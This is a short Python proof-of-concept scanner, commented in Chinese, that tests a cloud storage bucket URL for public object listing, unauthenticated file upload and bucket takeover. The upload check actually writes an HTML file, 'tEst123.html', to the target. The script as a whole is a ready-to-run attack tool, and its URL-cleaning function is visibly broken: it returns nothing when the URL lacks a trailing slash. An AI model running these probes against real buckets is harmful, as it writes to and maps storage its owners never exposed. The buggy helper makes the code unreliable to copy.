import requests
import argparse

def POC_ListObject(url):
    response = requests.get(url)  # 发送GET请求
    if "<Key>" in response.text and "<ID>" in response.text:
     print("存在bucket配置错误漏洞")
    else:
     print("不存在漏洞")
def POC_PutObject(url):
    test_url = url + "/tEst123.html"
    data = "<h1>\ntesttest\n</h1>"
    response = requests.put(test_url, data=data)
    if response.status_code == 200 :
        print("存在任意文件上传漏洞")
def POC_Hijack(url):
    response = requests.get(url)  # 发送GET请求
    if "NoSuchBucket" in response.text :
     print("存在存储桶劫持漏洞")

def clean_url(url):
    if url.endswith('/'):
        url = url[:-1]  # 删除末尾的斜杠
        return url


def main(url):

    # 在这里执行你的操作，使用传入的url参数
    POC_ListObject(url)
    POC_PutObject(url)
    POC_Hijack(url)

if __name__ == "__main__":
    # 创建一个ArgumentParser对象
    parser = argparse.ArgumentParser()
    # 添加-u参数
    parser.add_argument("-u", "--url", help="输入URL参数")
    # 解析命令行参数
    args = parser.parse_args()

    # 获取url参数的值
    url = args.url
    url = clean_url(url)
    # 调用主函数
    main(url)
